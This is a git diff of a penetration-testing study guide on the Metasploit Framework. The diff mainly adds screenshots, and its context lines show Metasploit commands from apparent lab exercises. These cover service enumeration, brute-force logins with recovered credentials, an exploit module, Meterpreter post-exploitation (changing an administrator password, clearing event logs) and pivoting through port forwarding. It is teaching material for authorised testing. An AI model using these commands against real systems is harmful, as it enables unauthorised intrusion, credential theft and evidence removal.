@@ -1,4 +1,4 @@
-# 8. Metasploit Framework (MSF)
+# Metasploit Framework
 
 ### Introduction
 
@@ -39,6 +39,8 @@
 * **Listener :** a utility that listens for an incoming connection from a target.
 
 ### Architecture
+
+<figure><img src="../../.gitbook/assets/71.png" alt=""><figcaption></figcaption></figure>
 
 * A module in the context of MSF is a piece of code that can be utilized be the MSF.
 * The MSF libraries facilitate the execution of modules without having to write the code necessary in order to execute them.
@@ -86,6 +88,8 @@ post/
 * We can adopt the **PTES** (Penetration Testing Execution Standard) as a roadmap to understanding the various phases that make up a penetration test and how Metasploit can be integrated in to each phase. The PTES is a penetration testing methodology that was developed by a team of information security practitioners with the aim of addressing the need for a comprehensive and up-to-date standard for penetration testing. It is available on GitHub on https://github.com/penetration-testing-execution-standard/ptes.
 
 #### Phases
+
+<figure><img src="../../.gitbook/assets/72.png" alt=""><figcaption></figcaption></figure>
 
 | Phase                                 | MSF implementation                     |
 | ------------------------------------- | -------------------------------------- |
@@ -215,6 +219,10 @@ msf5> hosts
 msf5> services
 ```
 
+<figure><img src="../../.gitbook/assets/73.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/74.png" alt=""><figcaption></figcaption></figure>
+
 #### MSF built-in Nmap
 
 ```
@@ -309,6 +317,8 @@ msf5> set rhosts 192.7.200.3
 msf5> run
 ```
 
+<figure><img src="../../.gitbook/assets/75.png" alt=""><figcaption></figcaption></figure>
+
 ```
 msf5> use auxiliary/scanner/ftp/ftp_login
 msf5> set rhosts 192.7.200.3
@@ -342,10 +352,14 @@ msf5> use auxiliary/scanner/smb/smb_version
 msf5> run
 ```
 
+<figure><img src="../../.gitbook/assets/76.png" alt=""><figcaption></figcaption></figure>
+
 ```
 msf5> use auxiliary/scanner/smb/smb_enumusers
 msf5> run
 ```
+
+<figure><img src="../../.gitbook/assets/77.png" alt=""><figcaption></figcaption></figure>
 
 The users are `john` `elie` `aisha` `shawn` `emma` `admin`.
 
@@ -354,6 +368,8 @@ msf5> use auxiliary/scanner/smb/smb_enumshares
 msf5> set showfiles true
 msf5> run
 ```
+
+<figure><img src="../../.gitbook/assets/78.png" alt=""><figcaption></figcaption></figure>
 
 ```
 msf5> use auxiliary/scanner/smb/smb_login
@@ -367,6 +383,8 @@ The credentials are `admin:password`.
 ```
 root@attackdefense> smbclient -L \\\\192.64.76.3\\ -U admin
 ```
+
+<figure><img src="../../.gitbook/assets/80.png" alt=""><figcaption></figcaption></figure>
 
 ```
 root@attackdefense> smbclient \\\\192.64.76.3\\public -U admin
@@ -396,13 +414,19 @@ msf5> use auxiliary/scanner/http/http_version
 msf5> run
 ```
 
+<figure><img src="../../.gitbook/assets/81.png" alt=""><figcaption></figcaption></figure>
+
 ```
 msf5> use auxiliary/scanner/http/http_header
 ```
 
+<figure><img src="../../.gitbook/assets/82.png" alt=""><figcaption></figcaption></figure>
+
 ```bash
 msf5> use auxiliary/scanner/http/robots_txt
 ```
+
+<figure><img src="../../.gitbook/assets/83.png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 msf5> curl http://192.227.166.3/data/
@@ -412,10 +436,14 @@ msf5> use auxiliary/scanner/http/dir_scanner
 msf5> run
 ```
 
+<figure><img src="../../.gitbook/assets/84.png" alt=""><figcaption></figcaption></figure>
+
 ```
 msf5> use auxiliary/scanner/http/files_dir
 msf5> run
 ```
+
+<figure><img src="../../.gitbook/assets/85.png" alt=""><figcaption></figcaption></figure>
 
 ```
 msf5> use auxiliary/scanner/http/apache_userdir_enum
@@ -423,6 +451,8 @@ msf5> set user_file /usr/share/metasploit-framework/data/wordlists/common_users.
 msf5> set verbose false
 msf5> run
 ```
+
+<figure><img src="../../.gitbook/assets/86.png" alt=""><figcaption></figcaption></figure>
 
 The user is `rooty`.
 
@@ -452,6 +482,8 @@ msf5> search type:auxiliary name:mysql
 msf5> run
 ```
 
+<figure><img src="../../.gitbook/assets/87.png" alt=""><figcaption></figcaption></figure>
+
 ```
 msf5> use auxiliary/scanner/mysql/mysql_login
 msf5> set username root
@@ -460,11 +492,15 @@ msf5> set stop_on_success true
 msf5> run
 ```
 
+<figure><img src="../../.gitbook/assets/88.png" alt=""><figcaption></figcaption></figure>
+
 ```
 msf5> use auxiliary/admin/mysql/mysql_enum
 msf5> setg username root
 msf5> setg password twinkle
 ```
+
+<figure><img src="../../.gitbook/assets/89.png" alt=""><figcaption></figcaption></figure>
 
 ```
 msf5> use auxiliary/admin/mysql/mysql_sql
@@ -472,10 +508,14 @@ msf5> set sql 'show database;'
 msf5> run
 ```
 
+<figure><img src="../../.gitbook/assets/90.png" alt=""><figcaption></figcaption></figure>
+
 ```
 msf5> use auxiliary/scanner/mysql/mysql_schemadump
 msf5> run
 ```
+
+<figure><img src="../../.gitbook/assets/91.png" alt=""><figcaption></figcaption></figure>
 
 ### SSH enumeration
 
@@ -493,6 +533,8 @@ msf5> use auxiliary/scanner/ssh/ssh_version
 msf5> run
 ```
 
+<figure><img src="../../.gitbook/assets/92.png" alt=""><figcaption></figcaption></figure>
+
 ```
 msf5> use auxiliary/scanner/ssh/ssh_login
 msf5> set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
@@ -506,11 +548,15 @@ msf5> sessions 1
 sysadmin@victim-1> id
 ```
 
+<figure><img src="../../.gitbook/assets/93.png" alt=""><figcaption></figcaption></figure>
+
 ```
 msf5> use auxiliary/scanner/ssh/ssh_enumusers
 msf5> set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
 msf5> run
 ```
+
+<figure><img src="../../.gitbook/assets/94.png" alt=""><figcaption></figcaption></figure>
 
 ### SMTP enumeration
 
@@ -526,10 +572,14 @@ msf5> use auxiliary/scanner/smtp/smtp_version
 msf5> run
 ```
 
+<figure><img src="../../.gitbook/assets/95.png" alt=""><figcaption></figcaption></figure>
+
 ```
 msf5> use auxiliary/scanner/smtp/smtp_enum
 msf5> run
 ```
+
+<figure><img src="../../.gitbook/assets/96.png" alt=""><figcaption></figcaption></figure>
 
 ### Vulnerability scanning
 
@@ -647,15 +697,21 @@ msf6> wmap_targets -l    # list targets
 msf6> wmap_run -t
 ```
 
+<figure><img src="../../.gitbook/assets/97.png" alt=""><figcaption></figcaption></figure>
+
 ```bash
 msf6> wmap_run -e
 ```
+
+<figure><img src="../../.gitbook/assets/98.png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 msf6> use auxiliary/scanner/http/http_put
 msf6> set path /data/
 msf6> run
 ```
+
+<figure><img src="../../.gitbook/assets/99.png" alt=""><figcaption></figcaption></figure>
 
 ### Client-side attacks
 
@@ -1023,6 +1079,8 @@ meterpreter> sysinfo
 ```
 
 ### Post exploitation
+
+<figure><img src="../../.gitbook/assets/100.png" alt=""><figcaption></figcaption></figure>
 
 * Post exploitation refers to the actions performed on the target system after initial access has been obtained.
 * The post exploitation phase of a penetration test consists of various techniques like :
@@ -1398,9 +1456,15 @@ C:> net user administrator password_12345
 # CTRL+C
 ```
 
+<figure><img src="../../.gitbook/assets/101.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/102.png" alt=""><figcaption></figcaption></figure>
+
 ```bash
 meterpreter> clearev  # clear all events
 ```
+
+<figure><img src="../../.gitbook/assets/103.png" alt=""><figcaption></figcaption></figure>
 
 All events get deleted !
 
@@ -1409,6 +1473,8 @@ All events get deleted !
 * Pivoting is a post exploitation technique that involves utilizing a compromised host to attack other systems on the compromised host's private internal network.
 * After gaining access to one host, we can use the compromised host to exploit other hosts on the same internal network to which we could not access previously.
 * Meterpreter provides us with the ability to add a network route to the internal network's subnet and consequently scan and exploit other systems on the network.
+
+<figure><img src="../../.gitbook/assets/104.png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 kali@kali> ping 10.3.28.166  # can reach it
@@ -1423,6 +1489,8 @@ msf6> run
 
 meterpreter> ipconfig
 ```
+
+<figure><img src="../../.gitbook/assets/105.png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 # Metasploit has no gateway to hit the address 10.3.25.211 yet
@@ -1441,6 +1509,8 @@ msf6> set ports 1-100
 msf6> run
 ```
 
+<figure><img src="../../.gitbook/assets/106.png" alt=""><figcaption></figcaption></figure>
+
 ```bash
 # You find an open port 10.3.25.211:80 and now you must give access to the attacker by port forwarding
 # Create a bound between the localhost and the unexposed machine service (port 80)
@@ -1451,6 +1521,8 @@ meterpreter> portfwd add -l 1234 -p 80 -r 10.3.25.211
 msf6> db_nmap -sV -sS -p 1234 localhost
 msf6> services
 ```
+
+<figure><img src="../../.gitbook/assets/107.png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 msf6> use exploit/windows/http/badblue_passthru
@@ -1490,11 +1562,15 @@ msf6> set session 2
 msf6> run
 ```
 
+<figure><img src="../../.gitbook/assets/108.png" alt=""><figcaption></figcaption></figure>
+
 ```bash
 msf6> use post/multi/gather/env
 msf6> set session 2
 msf6> run
 ```
+
+<figure><img src="../../.gitbook/assets/109.png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 msf6> use post/linux/gather/enum_network
@@ -1502,11 +1578,15 @@ msf6> set session 2
 msf6> run
 ```
 
+<figure><img src="../../.gitbook/assets/110.png" alt=""><figcaption></figcaption></figure>
+
 ```bash
 msf6> use post/linux/gather/enum_protections
 msf6> set session 2
 msf6> run
 ```
+
+<figure><img src="../../.gitbook/assets/111.png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 msf6> use post/linux/gather/enum_system
@@ -1514,17 +1594,23 @@ msf6> set session 2
 msf6> run
 ```
 
+<figure><img src="../../.gitbook/assets/112.png" alt=""><figcaption></figcaption></figure>
+
 ```bash
 msf6> use post/linux/gather/checkcontainer
 msf6> set session 2
 msf6> run
 ```
 
+<figure><img src="../../.gitbook/assets/113.png" alt=""><figcaption></figcaption></figure>
+
 ```bash
 msf6> use post/linux/gather/checkvm
 msf6> set session 2
 msf6> run
 ```
+
+<figure><img src="../../.gitbook/assets/114.png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 msf6> use post/linux/gather/enum_users_history
@@ -1556,6 +1642,8 @@ jackie@victim-1> ps aux
 jackie@victim-1> cat /bin/check-down
 # CTRL+Z
 ```
+
+<figure><img src="../../.gitbook/assets/115.png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 msf6> search chkrootkit
